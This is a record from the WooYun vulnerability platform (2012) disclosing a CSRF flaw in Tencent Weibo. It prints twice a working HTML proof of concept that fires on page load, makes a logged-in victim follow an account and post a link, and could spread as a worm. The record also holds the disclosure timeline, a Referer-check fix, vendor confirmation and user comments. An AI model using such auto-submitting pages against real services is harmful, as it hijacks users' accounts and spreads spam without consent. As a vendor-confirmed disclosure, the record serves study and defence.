{"id": 20133, "wybug_id": "wooyun-2012-05876", "wybug_title": "腾讯微博CSRF--可导致蠕虫", "wybug_corp": "腾讯", "wybug_author": "PiaCa", "wybug_date": "2012-04-08 23:28", "wybug_open_date": "2012-05-23 23:29", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-04-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-04-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-04-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-04-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-05-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-05-23：\t细节向公众公开  简要描述： 加关注、发微博对Referer无限制。描述好简单。 详细说明：  1、登陆微博2、访问http://50.19.159.231/qq.html3、会加关注，发一条微博<html><head><title>tencent weibo csrf test</title><script type=\"text/javascript\">//follow mefunction addF(){    document.getElementById(\"addF\").submit();}//add twitterfunction addT(){    document.getElementById(\"msg\").value = \"http://url.cn/1esqxW \" + String(Math.random())    document.getElementById(\"addT\").submit();}</script></head><body onload=\"addF();addT();\"><form target=\"addFF\" id=\"addF\" method=\"POST\" action=\"http://dev.open.t.qq.com/developer/listen\"><input type=\"text\" name=\"name\" value=\"helloubox\"><input type=\"submit\" value=\"go\"></form><form target=\"addTF\" id=\"addT\" method=\"POST\" action=\"http://app.zhibo.qq.com/app2/mb_post2.php\"><input type=\"text\" id=\"msg\" name=\"msg\" value=\"\"><input type=\"submit\" value=\"go\"></form><iframe name=\"addFF\"></iframe><iframe name=\"addTF\"></iframe></body></html>   漏洞证明：  1、登陆微博2、访问http://50.19.159.231/qq.html3、会加关注，发一条微博<html><head><title>tencent weibo csrf test</title><script type=\"text/javascript\">//follow mefunction addF(){    document.getElementById(\"addF\").submit();}//add twitterfunction addT(){    document.getElementById(\"msg\").value = \"http://url.cn/1esqxW \" + String(Math.random())    document.getElementById(\"addT\").submit();}</script></head><body onload=\"addF();addT();\"><form target=\"addFF\" id=\"addF\" method=\"POST\" action=\"http://dev.open.t.qq.com/developer/listen\"><input type=\"text\" name=\"name\" value=\"helloubox\"><input type=\"submit\" value=\"go\"></form><form target=\"addTF\" id=\"addT\" method=\"POST\" action=\"http://app.zhibo.qq.com/app2/mb_post2.php\"><input type=\"text\" id=\"msg\" name=\"msg\" value=\"\"><input type=\"submit\" value=\"go\"></form><iframe name=\"addFF\"></iframe><iframe name=\"addTF\"></iframe></body></html>   修复方案：  对referer来源限制等   版权声明：转载请注明来源 PiaCa@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2012-04-09 14:48 厂商回复： 非常感谢您的反馈，我们已经紧急修复完毕。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-04-09 00:02 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  我擦。    \n     2012-04-09 00:18 |    \t\tXhm1n9 \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:13        | bug)\t\t \n  其实它是有判断 referer的    \n     2012-04-09 07:54 |    \t\t明.   \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:7        | ส็็็็็็็็็็็็็็็็็็็...)\t\t \n  最近刚好研究CSRF，哪里有比较好的资料。？    \n     2012-04-09 08:52 |    \t\tSZn \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | 雄鹰小时候也叫菜鸟！)\t\t \n  坐等真相，这个给力！    \n     2012-04-09 10:01 |    \t\tPiaCa \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:10        | 简单点!啪......嚓~~)\t\t \n  @Xhm1n9 能看到真相？这两个地方的确不判断referer的。    \n     2012-04-09 10:01 |    \t\tPiaCa \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:10        | 简单点!啪......嚓~~)\t\t \n  @SZn csrf快泛滥了~~    \n     2012-04-09 11:43 |    \t\tXhm1n9 \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:13        | bug)\t\t \n  @PiaCa 我们说的应该不是一个地方:(    \n     2012-05-09 13:06 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @xsser 神 上面明明写着2012-04-29： 细节向普通白帽子公开向普通白帽子公开 为啥 我不能看呢？谢谢     \n     2012-05-24 00:12 |    \t\tunic02n \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:9        | 我是来学习的！)\t\t \n  piaca牛v5，很多时候，我们都想当然的高估了程序员，    \n     2013-02-11 06:24 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  物以稀为贵    \n     2014-09-28 18:12 |    \t\tCoffee \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:15        | Corie, a student of RDFZ.)\t\t \n  突然从电脑里翻出了PiaCa大牛的课件，想起PiaCa大牛去我们学校讲过网络安全课。膜拜一下。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}